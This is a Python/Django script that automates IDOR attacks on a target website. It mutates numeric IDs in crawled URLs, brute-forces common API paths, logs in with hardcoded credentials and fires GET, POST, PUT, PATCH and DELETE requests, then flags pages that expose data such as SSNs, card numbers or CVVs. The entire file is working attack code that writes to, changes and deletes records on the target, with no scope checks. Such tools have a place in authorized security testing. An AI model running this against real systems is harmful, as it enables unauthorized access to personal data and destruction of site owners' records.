import os
import re
import sys

import django

BASE_DIR = os.path.dirname(os.path.abspath("./Wrapper"))
sys.path.append(BASE_DIR)
os.environ["DJANGO_SETTINGS_MODULE"] = "Wrapper.settings"
django.setup()

import requests  # noqa: E402  (import after django.setup)
from bs4 import BeautifulSoup  # noqa: E402
from django.db import transaction  # noqa: E402

from common import (  # noqa: E402
    main_common_pattern_to_traverse_a_website as MAIN_COMMON_PATTERN,
)
from core.models import (  # noqa: E402
    LinkActionItem,
    LinkActionItemPost,
    LinkActionItemResponse,
    LinkItem,
)

LOGIN_LINK = ["login", "Login", "signin", "sessions"]
SENSITIVE_INFO = [
    "social security numbers",
    "ssn",
    "driver license number",
    "financial identifiers",
    "citizen visa code",
    "test scores",
    "biometric identifiers",
    "account balances",
    "bank account number",
    "credit card number",
    "payment history",
    "income history",
    "expiration",
    "cvv",
    "cvv2",
    "pin",
    "bin",
]

os.system("clear")


def _get_url():
    """Return the target domain saved by the crawler step."""
    path = os.path.join("idord_infograther", "link_to_crawl.txt")
    try:
        with open(path, "r") as handle:
            return handle.readline().strip()
    except OSError:
        return None


def _get_api(base_link):
    """Build the candidate API/base URLs (with schemes) for the target."""
    return [
        f"http://api.{base_link}",
        f"http://{base_link}",
        f"https://api.{base_link}",
        f"https://{base_link}",
    ]


BASE_LINK = _get_url()
API_LINKS = _get_api(BASE_LINK)
# Fetchable base URL (requests needs an explicit scheme).
BASE_LINK_GET = f"http://{BASE_LINK}"


def has_numbers(input_string):
    """True if the string contains at least one digit."""
    return any(char.isdigit() for char in input_string)


@transaction.atomic
def generate_attack():
    """Generate manipulated links/payloads for every crawled link."""
    for link in LinkItem.objects.all():
        if not has_numbers(link.link):
            continue

        matching = re.split(r"\W+", str(link.link))
        for i in range(len(matching)):
            original = matching[i]

            # Only mutate purely numeric path/query segments.
            if not original.isdigit():
                continue

            for j in range(10):
                matching[i] = str(j)
                mutated_path = "/".join(matching)
                try:
                    LinkActionItem.objects.create(
                        link=f"{BASE_LINK_GET}{mutated_path}",
                        orginal_param=original,
                        manupulated_param=matching[i],
                    )
                except Exception:
                    pass

                for api_link in API_LINKS:
                    try:
                        LinkActionItem.objects.create(
                            link=f"{api_link}{mutated_path}",
                            orginal_param=original,
                            manupulated_param=matching[i],
                        )
                    except Exception:
                        pass

            # Restore the original segment before moving on.
            matching[i] = original

    # Brute-force common resource patterns with numeric ids (GET/PUT/... targets).
    for api_link in API_LINKS:
        for pattern in MAIN_COMMON_PATTERN:
            for j in range(10):
                try:
                    LinkActionItem.objects.create(
                        link=f"{api_link}/{pattern}/{j}",
                        manupulated_param=str(j),
                    )
                except Exception:
                    pass

    # Common resource patterns as POST targets.
    for api_link in API_LINKS:
        for pattern in MAIN_COMMON_PATTERN:
            try:
                LinkActionItemPost.objects.create(link=f"{api_link}/{pattern}")
            except Exception:
                pass


generate_attack()


def check_sensitive_info(html_page):
    """Return the sensitive keywords found in the page's text nodes."""
    soup = BeautifulSoup(html_page, "html.parser")
    result = []
    for tag_name in ("th", "p", "td", "header", "script"):
        for element in soup.find_all(tag_name):
            text = str(element.text).lower().strip()
            for keyword in SENSITIVE_INFO:
                if text == keyword:
                    result.append(keyword)
    return result


def _login_headers(response):
    """Extract the session headers we want to replay from a login response."""
    headers = dict(response.headers)
    replay = {}
    if "Set-Cookie" in headers:
        replay["Set-Cookie"] = headers["Set-Cookie"]
    if "X-Request-Id" in headers:
        replay["X-Request-Id"] = headers["X-Request-Id"]
    return replay


def get_attack():
    headers = {"User-Agent": "Mozilla/5.0"}
    payload = {"email": "a@a.com", "password": "ashikashik"}
    session = requests.Session()

    # Try the known login endpoints until one accepts the credentials.
    response = None
    for path in LOGIN_LINK:
        try:
            response = session.post(
                f"{BASE_LINK_GET}/{path}/", headers=headers, data=payload
            )
        except requests.RequestException:
            continue
        if response.status_code == 200:
            break

    if response is None:
        return None

    replay_headers = _login_headers(response)

    for action_item in LinkActionItem.objects.all():
        try:
            data = session.get(action_item.link, headers=replay_headers)
        except requests.RequestException:
            continue

        if data.text is None:
            continue

        result = check_sensitive_info(data.text)
        if result:
            print(
                "___________________________________________________\n"
                f"GET : {action_item.link}"
            )
            print("_____________________________________________________")
            return 1

    return None


def post_attack():
    headers = {"User-Agent": "Mozilla/5.0"}
    payload = {
        "title": "actualHack on post method",
        "name": "actualHackName on post method",
    }
    session = requests.Session()

    for link in LinkActionItemPost.objects.all():
        try:
            response = session.post(link.link, headers=headers, data=payload)
        except requests.RequestException:
            continue

        if response.status_code == 201:
            print(
                "______________________________________________\n"
                f"POST IDOR: {link.link}"
            )
            LinkActionItemResponse.objects.create(
                action="post",
                action_link=link.link,
                status="post_idor",
                tag="Hacker Can create a new entry in your database",
            )
            print("_______________________________________________")
            return 1

    return None


def put_attack():
    headers = {"User-Agent": "Mozilla/5.0"}
    payload = {
        "title": "actualHack on put method",
        "name": "actualHackName on put method",
    }
    session = requests.Session()

    for link in LinkActionItem.objects.all():
        try:
            response = session.put(link.link, headers=headers, data=payload)
        except requests.RequestException:
            continue

        if response.status_code == 200:
            print(
                "______________________________________________\n"
                f"PUT IDOR: {link.link}"
            )
            LinkActionItemResponse.objects.create(
                action="put",
                action_link=link.link,
                status="put_idor",
                tag="Hacker Can changes your database",
            )
            print("________________________________________________")
            return 1

    return None


def patch_attack():
    headers = {"User-Agent": "Mozilla/5.0"}
    payload = {
        "title": "actualHack on patch method",
        "name": "actualHackName on patch method",
    }
    session = requests.Session()

    for link in LinkActionItem.objects.all():
        try:
            response = session.patch(link.link, headers=headers, data=payload)
        except requests.RequestException:
            continue

        if response.status_code == 200:
            print(
                "______________________________________________\n"
                f"PATCH IDOR: {link.link}"
            )
            LinkActionItemResponse.objects.create(
                action="patch",
                action_link=link.link,
                status="patch_idor",
                tag="Hacker Can changes your database",
            )
            print("________________________________________________")
            return 1

    return None


def delete_attack():
    headers = {"User-Agent": "Mozilla/5.0"}
    session = requests.Session()

    for link in LinkActionItem.objects.all():
        try:
            response = session.delete(link.link, headers=headers)
        except requests.RequestException:
            continue

        if response.status_code == 200:
            print(
                "______________________________________________\n"
                f"DELETE IDOR:{link.link}"
            )
            LinkActionItemResponse.objects.create(
                action="delete",
                action_link=link.link,
                status="delete_idor",
                tag="Hacker Can delete your database entry",
            )
            print("________________________________________________")
            return 1

    return None


def run_attacks():
    """Run each attack type, stopping at the first confirmed finding."""
    checks = (
        (get_attack, "GET"),
        (post_attack, "POST"),
        (put_attack, "PUT"),
        (patch_attack, "PATCH"),
        (delete_attack, "DELETE"),
    )
    for attack, label in checks:
        if attack():
            return
        print(f"No {label} IDOR Vulnerability Found")


run_attacks()
